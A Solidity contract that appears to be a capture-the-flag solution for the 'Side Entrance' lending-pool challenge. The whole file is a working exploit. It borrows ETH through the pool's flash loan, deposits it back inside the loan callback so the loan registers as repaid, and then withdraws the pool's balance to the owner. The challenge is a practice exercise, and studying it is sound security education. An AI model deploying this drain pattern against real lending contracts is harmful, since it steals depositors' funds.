// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";
import "./SideEntranceLenderPool.sol";


/**
 * @title SideEntranceLenderPoolReciever
 * @dev This contract is used to exploit the SideEntranceLenderPool contract's vulnerability | IT IS NOT A PART OF THE LEVEL'S REGLAMENT, BUT A PART OF THE SOLUTION!
 * @author Kristian Apostolov @CrisCodesCrap
 */
contract SideEntranceLenderPoolReciever {

    error Unauthorized();

    address public immutable owner;
    SideEntranceLenderPool public immutable pool;

    constructor(address _owner, address _pool) {
        owner = _owner;
        pool = SideEntranceLenderPool(_pool);
    }

    receive() external payable { }

    function getFlashLoan(uint256 amount) external {
        pool.flashLoan(amount);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    function sendBalance() external {
        if (owner != msg.sender) {
            revert Unauthorized();
        }
        pool.withdraw();
        SafeTransferLib.safeTransferETH(msg.sender, address(this).balance);
    }

}